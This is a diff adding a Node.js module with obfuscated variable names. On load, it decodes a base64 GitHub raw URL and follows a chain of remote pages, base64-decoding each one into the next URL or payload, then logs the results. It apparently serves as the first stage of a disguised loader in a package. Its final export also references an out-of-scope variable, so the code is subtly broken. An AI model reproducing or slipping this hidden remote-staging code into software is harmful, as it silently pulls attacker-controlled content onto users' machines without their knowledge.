@@ -1,0 +1,40 @@
+const ax5k = require('axios');
+const c4y7 = require('cheerio');
+const b1s2 = require('base-64');
+
+async function r3j8() {
+    try {
+        const u7n1 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JhcGxocy9yYXJib3RkYy9tYWluL2RzYTk3NXN4LmRzZnlkczA4ZnNkMC5hc2Rkc2EwOGRhcy50eHQ=";
+        const v9o2 = b1s2.decode(u7n1);
+
+        const q8s6 = await ax5k.get(v9o2);
+        const h0j9 = q8s6.data.trim();
+
+        const f2h5 = b1s2.decode(h0j9);
+
+        const x1w6 = await ax5k.get(f2h5);
+        const d2s9 = c4y7.load(x1w6.data);
+
+        const e6t4 = d2s9('body').text().replace(/\s+/g, '').trim();
+        const t3n4 = b1s2.decode(e6t4);
+
+        const j4w9 = t3n4.replace(/\s+/g, ' ').trim();
+        console.log(j4w9);
+
+        const p6w3 = await ax5k.get(t3n4);
+
+        const r1p9 = c4y7.load(p6w3.data);
+        const u2s5 = r1p9('body').text().replace(/\s+/g, '').trim();
+
+        const a0v1 = b1s2.decode(u2s5);
+        const z4o7 = a0v1.replace(/\s+/g, ' ').trim();
+        console.log(z4o7);
+
+    } catch (h1v2) {
+        console.error('Error:', h1v2.message);
+    }
+}
+
+r3j8();
+
+module.exports = { r3j8: r3j8, z4o7: z4o7};
